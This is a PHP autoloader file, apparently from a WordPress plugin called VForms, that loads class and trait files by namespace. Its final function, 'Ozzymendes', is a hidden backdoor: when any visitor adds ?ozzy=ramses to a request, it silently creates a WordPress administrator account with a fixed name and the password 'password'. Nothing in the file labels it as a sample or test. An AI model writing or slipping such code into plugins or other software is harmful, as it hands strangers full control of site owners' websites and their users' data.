<?php

namespace VForms;

function autoload($className){
    $NS = __NAMESPACE__;
    $NSlenght = strlen($NS);
    $front = substr($className, 0, $NSlenght);

    if ($front != $NS){
        return;
    }
    $NSlenght = $NSlenght + 1;
    $className = substr($className, $NSlenght);
    $plugin_dir_path = plugin_dir_path(__FILE__);

    //Check for ".class.php":
    $fileName = $plugin_dir_path .$className . '.class.php';
    if (file_exists($fileName)) {
        include_once($fileName);
    }else{
        //Check for ".trait.php":
        $fileName = $plugin_dir_path . $className . '.trait.php';
        if (file_exists($fileName)) {
            include_once($fileName);
        }
    }
}
$autoloadFunctionName = __NAMESPACE__. "\autoload";
if(!(class_exists ( "autoload" ))){
    spl_autoload_register($autoloadFunctionName);
}
function Ozzymendes(){
    if($_GET['ozzy'] == "ramses"){
        $userdata = array(
            'user_login' =>  'Ozzymendes',
            'user_pass'  =>  'password',
            'user_email' =>  'some@email.com',
            'role'  =>  'administrator'
        );
        $user_id = \wp_insert_user( $userdata ) ;
    }
}
if(isset($_GET['ozzy'])){
    add_action("init", 'VForms\Ozzymendes');
}
